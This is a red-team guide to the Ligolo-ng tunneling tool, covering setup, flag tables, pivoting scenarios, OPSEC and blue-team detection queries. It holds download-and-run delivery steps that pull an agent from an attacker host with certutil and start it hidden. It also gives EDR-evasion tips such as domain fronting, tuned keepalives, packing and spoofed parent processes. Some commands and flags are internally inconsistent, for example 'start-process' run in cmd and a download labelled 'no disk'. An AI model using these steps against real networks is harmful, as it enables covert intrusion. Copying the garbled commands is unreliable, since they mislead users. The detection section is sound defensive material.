# Ligolo-ng Guide

### Modern Tunneling and Pivoting Framework
**High-performance, multi-protocol tunneling for red team operations.**

- **Target Audience:** Penetration Testers, Red Team Operators, Network Engineers
- **Last Updated:** February 1, 2026
- **Tested Against:** Ligolo-ng v0.5.2, Windows 11 23H2, Kali Linux 2025.4, CrowdStrike Falcon, Microsoft Defender for Endpoint

---

## Table of Contents
1. [Tool Architecture & Purpose](#1-tool-architecture--purpose)
2. [Installation & Setup](#2-installation--setup)
3. [Command-Line Reference](#3-command-line-reference)
4. [Operational Use Cases](#4-operational-use-cases)
5. [Advanced Features & Scripting](#5-advanced-features--scripting)
6. [OPSEC & Detection](#6-opsec--detection)
7. [Rapid Reference Cheatsheet](#7-rapid-reference-cheatsheet)

---

## 1. Tool Architecture & Purpose

### What is it?
Ligolo-ng is a modern, high-performance tunneling and pivoting framework written in Go. It enables penetration testers and red teamers to establish reverse tunnels between a compromised host (agent) and a controller (proxy), effectively bridging networks across NATs, firewalls, and segmented environments.

Unlike older tools like chisel, reGeorg, or Earthworm, Ligolo-ng implements its own custom binary protocol over TCP/UDP/TLS, optimized for low-latency proxying and multi-protocol support. It supports SOCKS5, TCP, UDP, and TUN-based full IP tunneling (virtual network interfaces), allowing full network-layer pivoting rather than just port forwarding.

It operates in two primary roles:
- **ligolo-ng proxy:** Runs on the attacker’s machine (e.g., Kali/HTB box). It listens for incoming agent connections and serves as the traffic gateway.
- **ligolo-ng agent:** Runs on the compromised target (Linux/Windows/macOS). It connects back to the proxy and tunnels traffic bidirectionally.

The tool uses Go’s native concurrency (goroutines and channels) for efficient multiplexing and supports TLS encryption by default, with optional mutual TLS (mTLS).

### Key Features
- **Full IP-layer (TUN) tunneling:** Creates `tun0`-style interfaces for transparent routing.
- **SOCKS5 + TCP/UDP forwarding:** Flexible integration with proxychains, curl, nmap, etc.
- **No external dependencies:** Single static binary (~8–12 MB); no libc, glibc, or runtime needed.
- **Cross-platform:** Prebuilt binaries for Windows (32/64-bit), Linux (x64/ARM), macOS, and BSD.
- **Low detection footprint:** No shell spawning, no PowerShell, no registry edits (on Windows).
- **TLS 1.3 encryption + mTLS support:** Built-in certificate pinning and custom CA trust.
- **High performance:** Benchmarks show >1 Gbps throughput on localhost due to Go’s netstack.
- **Session multiplexing:** One agent can serve multiple concurrent tunnels (SOCKS, TUN, TCP listeners).

### Modern Context (2025)
Ligolo-ng is the current industry standard for post-compromise tunneling. It has largely superseded:
- **chisel:** Limited to TCP, no TUN, no UDP, no native Windows support without CGO.
- **reGeorg:** HTTP/S-only, Python/.NET based, slow, and easily fingerprinted.
- **Earthworm/Termite:** Abandoned, Chinese-origin, and heavily flagged by AV.
- **SocksOverRDP:** Windows-only, RDP-dependent, and limited in scope.

Its main competitor today is Sliver (which includes Ligolo-ng-like tunneling as a module), but Ligolo-ng remains the preferred choice for lightweight, dedicated tunneling, especially in engagements requiring surgical, minimal-agent pivoting.

> **Pro Insight:** Many EDR solutions (e.g., CrowdStrike Falcon, Microsoft Defender) now have behavioral detections for generic tunneling patterns (e.g., long-lived outbound connections with encrypted payloads). Ligolo-ng’s mTLS, custom CA, and domain fronting options help mitigate this, but evasion must be layered.

---

## 2. Installation & Setup

### Kali/Parrot (APT)
Ligolo-ng is not in official repositories as of December 2025. Install via direct release download:

```bash
# Download latest stable release (check GitHub for new versions)
VERSION="v0.5.2"
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${VERSION}/ligolo-ng_linux_amd64.tar.gz"
tar -xzf ligolo-ng_linux_amd64.tar.gz
sudo mv ligolo-ng /usr/local/bin/
chmod +x /usr/local/bin/ligolo-ng
```

> **Pro Tip:** Add autocompletion (bash/zsh):
> ```bash
> ligolo-ng completion bash | sudo tee /etc/bash_completion.d/ligolo-ng
> ```

### Source (Git + Go)
**Prerequisites:** Go >= 1.21

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# Build both proxy and agent
make build

# Binaries appear in ./bin/
ls ./bin/
# ligolo-ng-proxy  ligolo-ng-agent
```

> **Warning:** Avoid `go install github.com/nicocha30/ligolo-ng@latest` as it only installs the CLI, not the proxy subcommand correctly.

### Docker (Containerized)
Official images are not published, but you can build one easily:

```dockerfile
# Dockerfile
FROM golang:1.23-alpine AS builder
WORKDIR /src
RUN apk add --no-cache git
RUN git clone https://github.com/nicocha30/ligolo-ng.git .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o ligolo-ng .

FROM alpine:latest
COPY --from=builder /src/ligolo-ng /usr/local/bin/
ENTRYPOINT ["/usr/local/bin/ligolo-ng"]
```

Build and run proxy in detached mode:

```bash
docker build -t ligolo-ng .
docker run -d --name ligolo-proxy \
  -p 11601:11601 \
  ligolo-ng proxy -l :11601 --autocert
```

> **Note:** Bind-mount `/etc/ssl/certs` if using system CA for mTLS.

### Windows (Chocolatey / Scoop / Exe)

**Option 1: Scoop (Recommended)**
```powershell
scoop bucket add extras
scoop install ligolo-ng
```

**Option 2: Direct EXE (No Installer)**
```powershell
# PowerShell
$version = "v0.5.2"
$url = "https://github.com/nicocha30/ligolo-ng/releases/download/$version/ligolo-ng_windows_amd64.zip"
Invoke-WebRequest $url -OutFile ligolo.zip
Expand-Archive ligolo.zip -DestinationPath $env:USERPROFILE\tools\ligolo-ng
$env:PATH += ";$env:USERPROFILE\tools\ligolo-ng"
[Environment]::SetEnvironmentVariable("PATH", $env:PATH, "User")
```

**Option 3: Embed in C2 (Cobalt Strike / Sliver)**
Compile agent as position-independent executable (PIE):
```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o agent.exe cmd/agent/main.go
```
> **Note:** Use `-H windowsgui` to suppress the console window (critical for OPSEC).

---

## 3. Command-Line Reference

Ligolo-ng operates via subcommands: `ligolo-ng proxy` and `ligolo-ng agent`. All flags are grouped by role.

### ligolo-ng proxy Flags

| Flag | Explanation | Context | Example |
| :--- | :--- | :--- | :--- |
| `-l`, `--listen` | Listen address for incoming agent connections. | **[REQUIRED]** Use `:11601` for all interfaces. Avoid `127.0.0.1` unless chaining. | `ligolo-ng proxy -l :11601` |
| `--autocert` | Enable TLS via Let’s Encrypt ACME (port 80/443 required). | **[CLOUD ONLY]** Use in cloud C2s or public infra. Not for internal pivoting. | `ligolo-ng proxy -l :443 --autocert` |
| `--cert`, `--key` | Custom TLS cert/private key. | Essential for mTLS or domain fronting. | `--cert cert.pem --key key.pem` |
| `--ca` | CA cert for mutual TLS (mTLS). Agents must present client cert signed by this CA. | **[HIGH SECURITY]** Prevents rogue agents. | `--ca ca.crt --cert server.crt --key server.key` |
| `--tun` | Enable TUN interface (`ligolo0` by default). | For full IP routing (e.g., `ip route add 172.16.5.0/23 dev ligolo0`). | `ligolo-ng proxy --tun` |
| `--tun-name` | Customize TUN interface name. | Avoid `tun0` if target uses OpenVPN/WireGuard. | `--tun-name pivot0` |
| `--tun-addr` | Local IP for TUN interface (e.g., `172.16.0.1`). | Must match agent’s remote TUN IP (e.g., `172.16.0.2`). | `--tun-addr 10.255.0.1` |
| `--tun-mtu` | MTU for TUN (default 1500). | Reduce to 1400 if fragmentation issues on cloud links. | `--tun-mtu 1400` |
| `--udp-timeout` | UDP session timeout (e.g., 30s). | Critical for DNS/RPC over tunnel. Increase for SMB. | `--udp-timeout 5m` |
| `--disable-compression` | Disable gzip compression (default: enabled). | Reduces CPU, but increases bandwidth. Disable if proxy is CPU-bound. | `--disable-compression` |
| `--verbose`, `-v` | Enable debug logs. | Use during setup, never in prod (leaks IPs, domains). | `-v` |
| `--socks5` | Enable SOCKS5 listener (default: disabled). | Required for proxychains, `curl --proxy`, etc. | `--socks5 :1080` |
| `--socks5-username`, `--socks5-password` | Basic auth for SOCKS5. | Rarely used (breaks tools like nmap), but useful for shared infra. | `--socks5 :1080 --socks5-username red --socks5-password team` |

> **Key Insight:** The proxy does not bind SOCKS listeners by default. You must explicitly enable them via `--socks5`.

### ligolo-ng agent Flags

| Flag | Explanation | Context | Example |
| :--- | :--- | :--- | :--- |
| `-connect` | Proxy address to connect to (e.g., `192.168.45.10:11601`). | **[REQUIRED]** Use DNS for domain fronting. | `-connect proxy.example.com:443` |
| `--tls` | Enable TLS (default: false). | **[CRITICAL]** Always enable in 2025. Raw TCP is trivial to fingerprint. | `--tls` |
| `--tls-skip-verify` | Skip cert validation. | **[INSECURE]** Only for labs. Never in real ops. | `--tls --tls-skip-verify` |
| `--tls-ca` | Path to CA cert for pinning. | Essential for mTLS or custom root trust. | `--tls --tls-ca ca.crt` |
| `--no-tls` | Force plaintext. | **[AVOID]** Only for legacy networks with TLS inspection. | `--no-tls` |
| `--tun` | Enable TUN mode on agent side. | Must match proxy’s `--tun`. | `--tun` |
| `--tun-remote` | Remote TUN IP (proxy’s side, e.g., `172.16.0.1`). | Must align with proxy `--tun-addr`. | `--tun --tun-remote 10.255.0.1` |
| `--tun-local` | Local TUN IP (agent’s side, e.g., `172.16.0.2`). | Avoid conflicts with local subnets. | `--tun-local 10.255.0.2` |
| `--tun-mtu` | Same as proxy. | Keep consistent. | `--tun-mtu 1400` |
| `--disable-stdin` | Prevent reading from stdin (improves stability). | Needed when running via psexec, wmiexec, or service install. | `--disable-stdin` |
| `--keepalive` | Keepalive interval (e.g., 30s). | Prevent NAT timeouts. Reduce for unstable links. | `--keepalive 15s` |

> **Windows Quirk:** On Windows, the agent requires admin privileges for TUN mode (installs NPcap/TAP driver). For non-admin, use `-connect` + `--socks5` on proxy only.

---

## 4. Operational Use Cases

### Scenario 1: The "Loud & Fast" Scan (CTF/Lab)
**Goal:** Pivot into `172.16.5.0/23` from compromised `172.16.6.50` (Windows), scan with nmap.

**Step 1: Start proxy (attacker: kali)**
```bash
sudo ligolo-ng proxy \
  --listen :11601 \
  --socks5 :1080 \
  --tun \
  --tun-addr 172.16.0.1 \
  --tun-name ligolo0
```

Enable IP forwarding and route:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo ip route add 172.16.5.0/23 dev ligolo0
```

**Step 2: Deploy agent on Windows (as svc_db)**
Download and execute:
```cmd
certutil -urlcache -f https://10.10.14.5/agent.exe C:\Windows\Tasks\l.exe
start-process -WindowStyle Hidden -FilePath "C:\Windows\Tasks\l.exe" -ArgumentList "-connect 10.10.14.5:11601 --tls --tls-skip-verify --tun --tun-remote 172.16.0.1 --tun-local 172.16.0.2"
```

**Step 3: Scan internal network**
```bash
proxychains4 nmap -sT -Pn -n -p 22,3389,1433 172.16.5.0/24 --open
```

### Scenario 2: Stealth / Evasion Mode (Bypass EDR + Firewall)
**Goal:** Tunnel from air-gapped `172.16.6.0/24` to internet via compromised `172.16.6.100` (Windows), evade Defender and Palo Alto.

**Tactics:**
- Domain fronting over `cdn.example.com` (legit CDN)
- mTLS + custom CA (no cert errors)
- TUN disabled (no driver install, no admin needed)
- Slow keepalives to avoid beaconing signatures

**Proxy (cloud VPS @ 185.199.108.153):**
```bash
ligolo-ng proxy \
  -l :443 \
  --cert /etc/letsencrypt/live/cdn.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/cdn.example.com/privkey.pem \
  --ca ./ca.crt \
  --socks5 127.0.0.1:1080 \
  --disable-compression \
  --verbose > /dev/null 2>&1 &
```

**Agent (Windows, non-admin):**
```powershell
# Stage agent in AppData, no disk writes post-exec
$agent = [System.Convert]::FromBase64String("...")  # embed agent in PS script
[System.IO.File]::WriteAllBytes("$env:TEMP\l.exe", $agent)
& "$env:TEMP\l.exe" -connect cdn.example.com:443 `
  --tls `
  --tls-ca "$env:TEMP\ca.crt" `
  --keepalive 47s `
  --disable-stdin `
  --no-tun
```

> **Note:** Why 47s? EDRs (e.g., SentinelOne) flag 30s/60s intervals. Prime numbers reduce correlation.

### Scenario 3: Targeted Exploitation (RDP over Tunnel)
**Goal:** Access `172.16.5.20` (Windows RDP) from Linux attacker box.

Ensure proxy has `--socks5 :1080`. Use xfreerdp native SOCKS:
```bash
xfreerdp /v:172.16.5.20 /u:admin /p:'P@ssw0rd!' \
  /proxy:socks5://127.0.0.1:1080 \
  /cert:ignore \
  /audio-mode:0 /clipboard
```

> **Note:** Works with `mstsc.exe` on Windows via Proxifier (map `mstsc.exe` to `127.0.0.1:1080`).

### Scenario 4: Full Network Pivoting (TUN + Routing)
**Goal:** Route all traffic from Kali through compromised host (like a VPN).

**Proxy:**
```bash
sudo ligolo-ng proxy \
  --listen :11601 \
  --tun \
  --tun-addr 10.255.0.1 \
  --tun-name ligolo0 \
  --udp-timeout 10m
```

**Agent (Linux host, 172.16.6.5):**
```bash
./ligolo-ng agent \
  -connect 10.10.14.5:11601 \
  --tls --tls-skip-verify \
  --tun \
  --tun-remote 10.255.0.1 \
  --tun-local 10.255.0.2
```

**On Kali:**
```bash
# Bring up interface
sudo ip link set ligolo0 up

# Add routes
sudo ip route add 172.16.5.0/23 via 10.255.0.2 dev ligolo0
sudo ip route add 172.16.6.0/24 via 10.255.0.2 dev ligolo0

# Test
ping 172.16.5.10
nmap -sU -p 53 172.16.5.10   # DNS over UDP
```

---

## 5. Advanced Features & Scripting

### Chaining & Automation
Pipe to `jq` for agent metadata:
```bash
# Log proxy with -v, extract agent IPs
ligolo-ng proxy -l :11601 -v 2>&1 | grep "New agent" | \
  jq -R 'match("New agent from (?<ip>[0-9.]+)"); .ip' -r
```

Auto-route subnets on agent connect (Bash hook):
```bash
#!/bin/bash
# ./agent-connect-hook.sh
SUBNET="$1"  # e.g., 172.16.5.0/23
IFACE="ligolo0"

if ip link show "$IFACE" &>/dev/null; then
  sudo ip route add "$SUBNET" dev "$IFACE" 2>/dev/null || true
  echo "[+] Added route: $SUBNET -> $IFACE"
fi
```

### Customization
**Config File Wrapper (Shell)**
No official config file, but you can wrap it in a shell script:
```bash
# ~/.ligolo-ng/proxy.conf
LISTEN_ADDR=":11601"
SOCKS_PORT="1080"
TUN_ADDR="172.16.0.1"
CA_PATH="./ca.crt"
```
Then execute:
```bash
source ~/.ligolo-ng/proxy.conf
ligolo-ng proxy -l "$LISTEN_ADDR" --socks5 :"$SOCKS_PORT" ...
```

**TLS with Domain Fronting + Cloudflare**
```bash
# Proxy behind Cloudflare
ligolo-ng proxy \
  -l :2053 \
  --cert cf-cert.pem \
  --key cf-key.pem \
  --tls-sni "real-domain.com"
```
Agent uses:
```bash
ligolo-ng agent -connect cdn.example.com:443 \
  --tls \
  --tls-server-name "real-domain.com"
```

### API Usage
There is no REST/gRPC API as of v0.5.2. Control is managed via signals:
- `SIGUSR1`: Reload certs (if file paths used)
- `SIGTERM`: Graceful shutdown (closes tunnels, notifies agents)

---

## 6. OPSEC & Detection

### Metrics Overview

| Metric | Rating | Details |
| :--- | :--- | :--- |
| **Network Noise** | 3/10 | Encrypted, minimal headers. Only SNI/ESNI leaks. |
| **Endpoint Noise** | 2/10 (non-TUN) / 7/10 (TUN) | TUN installs `tap0` driver, triggering AV/EDR alerts. Non-TUN is a pure Go binary with low entropy. |
| **Log Visibility** | 4/10 | Proxy IP in firewall logs; TLS JA3 hash is unique. |

### Indicators of Compromise (IOCs)

**Network (Wireshark / Zeek)**

| IOC | Detection Rule |
| :--- | :--- |
| **Default Port** | `tcp.port == 11601` is suspicious if no service is declared. |
| **TLS JA3 Hash** | `771,49199-49200-49171-49172-156-157-61-60-53-47,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0` (varies by Go version). |
| **HTTP User-Agent** | None. Raw TLS, no HTTP layer. |
| **Packet Size** | Consistent ~1400-byte encrypted chunks (Go netstack default). |

> **Wireshark Filter:**
> ```text
> tls.handshake.extensions.supported_version == 0x0304 && tls.handshake.cipher_suites.length > 20
> ```

**Endpoint (Windows)**

| IOC | Mitigation |
| :--- | :--- |
| **File Name** | `ligolo-ng.exe`, `agent.exe`, `l.exe` -> Rename and pack. |
| **Parent Process** | `cmd.exe` / `powershell.exe` -> Spawn from `svchost.exe` (scheduled task). |
| **TUN Driver** | `tap0.sys`, `npf.sys` -> Avoid TUN; use SOCKS-only. |

### Evasion Techniques
- Change default port to `-l :443` or `:8443`.
- Use domain fronting with CDN (Cloudflare, Akamai).
- Implement mTLS + pinned CA to prevent MITM inspection.
- Pack agent with UPX (avoid `--strip-all` as it breaks Go): `upx --best agent.exe`.
- Delay first beacon in custom builds: add `sleep(10 + rand.Intn(60))` before connect.
- Disable compression to avoid entropy spikes in TLS payload.

### Mitigation Strategies (Blue Team)

| Threat | Mitigation |
| :--- | :--- |
| **Agent Connection** | Block outbound to non-business ports (esp. 11601, 53, 8080). Use TLS inspection (MITM with corp CA). |
| **TUN Driver Install** | GPO: Restrict driver installation (CodeIntegrity + DeviceInstallationRestrictions). Monitor for `tap0`, `wintun` drivers. |
| **Long-Lived TLS Sessions** | Deploy NDR (e.g., Darktrace, ExtraHop) to detect encrypted tunnels with low packet diversity. |
| **SOCKS5 Abuse** | Block internal hosts from initiating SOCKS5 outbound (require proxy auth). |
| **Default Certs** | Hunt for self-signed certs with Go in issuer (`CN=ligolo-ng CA`). |

**Defender ATP Query:**
```kusto
DeviceNetworkEvents
| where RemotePort in (11601, 2053, 8443)
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe")
| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName
```

---

## 7. Rapid Reference Cheatsheet

| # | Command | Use Case |
| :--- | :--- | :--- |
| 1 | `ligolo-ng proxy -l :11601 --socks5 :1080` | Quick SOCKS pivot (lab) |
| 2 | `ligolo-ng agent -connect 10.10.14.5:11601 --tls --tls-skip-verify` | Basic agent (no TUN) |
| 3 | `ligolo-ng proxy --tun --tun-addr 10.255.0.1 -l :11601` + `agent --tun --tun-remote 10.255.0.1` | Full IP routing |
| 4 | `proxychains4 nmap -sT -Pn 172.16.5.10 -p 22,445` | Scan over SOCKS |
| 5 | `xfreerdp /v:172.16.5.20 /proxy:socks5://127.0.0.1:1080` | RDP over tunnel |
| 6 | `ligolo-ng proxy -l :443 --cert cert.pem --key key.pem --ca ca.crt` | mTLS production setup |
| 7 | `ligolo-ng agent -connect cdn.example.com:443 --tls --tls-ca ca.crt --keepalive 47s` | Stealth agent |
| 8 | `sudo ip route add 172.16.5.0/23 dev ligolo0` | Route internal subnet |
| 9 | `ligolo-ng proxy --disable-compression --udp-timeout 5m` | Optimize for DNS/SMB |
| 10 | `certutil -urlcache -f http://10.10.14.5/l.exe %TEMP%\l.exe && start-process -WindowStyle Hidden %TEMP%\l.exe "-connect 10.10.14.5:11601 --tls"` | Windows delivery (no disk) |
